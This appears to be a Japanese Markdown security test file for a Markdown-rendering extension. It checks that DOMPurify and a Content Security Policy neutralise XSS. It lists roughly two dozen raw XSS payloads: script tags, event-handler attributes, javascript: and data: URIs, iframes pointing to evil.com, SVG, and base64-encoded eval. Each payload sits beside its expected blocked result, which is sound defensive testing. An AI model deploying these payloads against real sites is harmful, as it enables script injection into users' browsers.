# セキュリティテスト

このファイルは、DOMPurifyとContent Security Policy (CSP)がXSS攻撃を正しくブロックするかをテストします。

---

## CSP設定

この拡張機能では、以下のContent Security Policy (CSP)を適用しています：

```
default-src 'self';
img-src 'self' data: file: https: http:;
style-src 'self' 'unsafe-inline';
script-src 'none';
```

### 各ディレクティブの意味

- **default-src 'self'**: すべてのリソースは拡張機能内からのみ
- **img-src 'self' data: file: https: http:**: 画像は拡張機能内 + data:スキーム + file:プロトコル + HTTP(S)
- **style-src 'self' 'unsafe-inline'**: CSSは拡張機能内 + インラインスタイル
- **script-src 'none'**: すべてのJavaScript実行を禁止

---

## ✅ 安全なコンテンツ（正常に表示される）

これは普通の段落です。

**太字**や*斜体*も表示されます。

- リスト項目1
- リスト項目2

```javascript
// コードブロックも安全
console.log("Hello, World!");
```

### テーブルも表示される

| 列1 | 列2 |
|-----|-----|
| データ1 | データ2 |

---

## ⚠️ XSS攻撃テスト（すべてブロックされるべき）

以下の攻撃コードは、DOMPurifyによって無害化され、**アラートは一切表示されません**。

### 1. script タグによる攻撃

<script>alert('XSS攻撃1: scriptタグ')</script>

<script type="text/javascript">
  alert('XSS攻撃2: type指定');
  document.body.innerHTML = '乗っ取り成功';
</script>

<script src="https://evil.com/malware.js"></script>

**期待される結果**:
- ✅ DOMPurifyで`<script>`タグが削除される
- ✅ アラートは表示されない

---

### 2. イベントハンドラによる攻撃

<img src="invalid.jpg" onerror="alert('XSS攻撃3: onerror')">

<img src="x" onload="alert('XSS攻撃4: onload')">

<div onclick="alert('XSS攻撃5: onclick')">このdivをクリックしても何も起こらないはず</div>

<body onload="alert('XSS攻撃6: body onload')">

<input type="text" onfocus="alert('XSS攻撃7: input onfocus')">

<button onclick="alert('XSS攻撃8: button')">押さないで</button>

**期待される結果**:
- ✅ DOMPurifyがイベントハンドラ属性を削除
- ✅ クリックやフォーカスしても何も起こらない

---

### 3. javascript: スキーム攻撃

[クリックしてはいけないリンク1](javascript:alert('XSS攻撃9: javascript:'))

<a href="javascript:alert('XSS攻撃10: aタグ')">クリックしてはいけないリンク2</a>

<a href="javascript:void(0)" onclick="alert('XSS攻撃11')">クリックしてはいけないリンク3</a>

**期待される結果**:
- ✅ `javascript:` スキームのリンクが無害化される
- ✅ クリックしてもアラートは表示されない

---

### 4. data: スキーム攻撃

<img src="data:text/html,<script>alert('XSS攻撃12: data:スキーム')</script>">

<a href="data:text/html,<script>alert('XSS攻撃13')</script>">data:スキームリンク</a>

**期待される結果**:
- ✅ 危険なdata:スキームがブロックされる
- ✅ 画像のdata:スキームは許可される（安全な場合のみ）

---

### 5. iframe による攻撃

<iframe src="javascript:alert('XSS攻撃14: iframe')"></iframe>

<iframe src="data:text/html,<script>alert('XSS攻撃15')</script>"></iframe>

<iframe src="https://evil.com/phishing"></iframe>

**期待される結果**:
- ✅ DOMPurifyが`<iframe>`タグを削除
- ✅ iframeは表示されない

---

### 6. object/embed による攻撃

<object data="javascript:alert('XSS攻撃16: object')"></object>

<embed src="javascript:alert('XSS攻撃17: embed')">

**期待される結果**:
- ✅ DOMPurifyが`<object>`と`<embed>`を削除
- ✅ これらのタグは表示されない

---

### 7. style による攻撃

<style>body { background: url('javascript:alert("XSS攻撃18")') }</style>

<div style="background: url('javascript:alert(\'XSS攻撃19\')')">スタイル攻撃</div>

**期待される結果**:
- ✅ DOMPurifyが`<style>`タグを削除
- ✅ 危険なインラインスタイルが無害化される

---

### 8. SVG による攻撃

<svg onload="alert('XSS攻撃20: SVG onload')"></svg>

<svg><script>alert('XSS攻撃21: SVG script')</script></svg>

**期待される結果**:
- ✅ DOMPurifyがSVG内のスクリプトとイベントハンドラを削除
- ✅ アラートは表示されない

---

### 9. エンコーディングを使った攻撃

<img src="x" onerror="eval(atob('YWxlcnQoJ1hTU+aUu+aSpTIyJyk='))">

<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;">

**期待される結果**:
- ✅ エンコードされた攻撃コードも無害化される
- ✅ アラートは表示されない

---

### 10. その他の攻撃パターン

<details open ontoggle="alert('XSS攻撃23: details')">
  <summary>開く</summary>
</details>

<marquee onstart="alert('XSS攻撃24: marquee')">動くテキスト</marquee>

<form action="javascript:alert('XSS攻撃25')">
  <input type="submit" value="送信">
</form>

<meta http-equiv="refresh" content="0;url=javascript:alert('XSS攻撃26')">

**期待される結果**:
- ✅ すべてのイベントハンドラが削除される
- ✅ 危険なタグが無害化または削除される

---

### 11. 見出しを使ったXSS攻撃

# <script>alert('H1攻撃')</script>見出し1

## <img src=x onerror="alert('H2攻撃')">見出し2

### <a href="javascript:alert('H3攻撃')">見出し3</a>

**期待される結果**:
- ✅ 見出しテキストから危険なタグが削除される
- ✅ アラートは表示されない

---

### 12. ファイル名を使ったXSS攻撃

このテストファイルのパスに攻撃コードが含まれている場合でも、エスケープ処理により無害化されます。

例：`<script>alert('filename')</script>.md`

**期待される結果**:
- ✅ ファイル名がHTMLエスケープされている
- ✅ ページタイトルに`<script>`タグが表示されない

---

## 📊 セキュリティチェック結果

以下の条件をすべて満たしていることを確認してください：

### ✅ 必須条件

1. **アラートは一切表示されない**
   - 上記のすべての攻撃コードでアラートが表示されないこと

2. **ページは正常に表示される**
   - 安全なコンテンツ（段落、リスト、テーブルなど）は正常に表示される

3. **コンソールにCSP violationエラーがない**
   - F12でDevToolsを開き、Consoleタブを確認
   - DOMPurifyで事前に削除されるため、CSPエラーは出ない

4. **危険なタグ・属性が削除されている**
   - F12でElementsタブを開き、`<script>`、`onclick`、`javascript:`などが存在しないことを確認

### 🔍 詳細確認（オプション）

DevToolsのConsoleで以下を実行して確認：

```javascript
// scriptタグが存在しないことを確認
document.querySelectorAll('script').length
// → 0 であるべき

// iframeが存在しないことを確認
document.querySelectorAll('iframe').length
// → 0 であるべき

// イベントハンドラ属性が存在しないことを確認
document.querySelectorAll('[onclick], [onerror], [onload]').length
// → 0 であるべき
```

---

## ⚠️ 重要な注意

**アラートが1つでも表示された場合は、重大なセキュリティ脆弱性があります！**

すべてのテストをパスすることで、以下が保証されます：

- ✅ DOMPurifyが正しくXSS攻撃を防いでいる
- ✅ CSPが追加の防御層として機能している
- ✅ ユーザーが提供したMarkdownコンテンツを安全に表示できる
